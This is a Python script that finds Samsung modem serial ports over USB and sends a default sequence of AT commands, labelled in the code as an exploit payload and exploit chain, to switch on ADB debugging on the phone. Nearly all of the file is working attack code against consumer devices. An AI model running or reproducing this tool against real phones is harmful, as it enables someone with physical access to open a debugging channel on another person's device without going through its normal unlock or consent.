#!/usr/bin/env python3
import logging
from threading import Lock
import time
from typing import List, Optional, Tuple

import serial
import serial.tools.list_ports

logger = logging.getLogger(__name__)


class SamsungADBEnabler:
    """Consolidated controller executing serial AT commands to enable ADB on Samsung devices."""
    def __init__(self) -> None:
        self._lock = Lock()

    @staticmethod
    def get_samsung_modem_ports() -> List[serial.tools.list_ports.ListPortInfo]:
        """Scans systems and extracts all active Samsung modem ports."""
        ports = list(serial.tools.list_ports.comports())
        samsung_ports = []
        
        for port in ports:
            # Samsung VID is 0x04E8
            if port.vid == 0x04E8:
                samsung_ports.append(port)
                logger.debug(f"Found Samsung vendor hardware: {port.device} - {port.description}")
            elif "samsung" in (port.description or "").lower():
                samsung_ports.append(port)
                logger.debug(f"Identified potential Samsung description: {port.device}")
                
        return samsung_ports

    def send_at_command(self, ser: serial.Serial, command: str, wait_time: float = 0.15) -> Tuple[bool, str]:
        """Sends an AT command to the serial interface and returns the response."""
        with self._lock:
            try:
                full_cmd = command.strip() + "\r\n"
                ser.reset_input_buffer()  # Flush older buffers
                
                logger.debug(f"Writing command sequence: {command}")
                ser.write(full_cmd.encode())
                time.sleep(wait_time)
                
                # Check for output data
                response = ""
                if ser.in_waiting:
                    raw_data = ser.read(ser.in_waiting)
                    response = raw_data.decode(errors="replace").strip()
                    logger.debug(f"Modem interface returned: {response}")
                
                is_ok = "OK" in response
                return is_ok, response
            except Exception as e:
                logger.error(f"Failed writing command to serial hardware interface: {e}")
                return False, str(e)

    def run_exploit_sequence(self, port_path: str, command_sequence: Optional[List[str]] = None) -> bool:
        """
        Opens a connection to the specified port and issues the AT command sequence
        to enable ADB.
        """
        # Default exploit payload sequences
        if command_sequence is None:
            command_sequence = [
                "AT",                       # Initialize connection
                "AT+SWATD=1",               # Enable Diagnostic Test modes
                "AT+ACTIVATE=0,0,0",        # Reset and activate communication
                "AT+DEBUGLVC=0,5",          # Enable Debug levels
                "AT+KSTRINGB=0,3",          # USB Debug configurations
                "AT+DUMPCTRL=1,0",          # Mount dump controllers
                "AT+SWATD=0"                # Finish and transition configuration
            ]

        logger.info(f"Attempting connection sequence on port: {port_path}")
        try:
            # 115200 is standard for Samsung Diagnostic port communications
            with serial.Serial(port_path, baudrate=115200, timeout=2) as ser:
                logger.info("Port successfully opened. Starting command dispatch...")
                
                for step, cmd in enumerate(command_sequence, start=1):
                    success, resp = self.send_at_command(ser, cmd)
                    if success:
                        logger.info(f"[Step {step}/{len(command_sequence)}] Passed command: {cmd}")
                    else:
                        logger.warning(
                            f"[Step {step}/{len(command_sequence)}] Command {cmd} did not return OK. "
                            f"Response: {resp}"
                        )
                        # We continue anyway, as some systems skip verification on earlier steps.
                
                logger.info("Exploit chain execution completed.")
                return True
        except Exception as e:
            logger.error(f"Failed executing exploit pipeline on port {port_path}: {e}")
            return False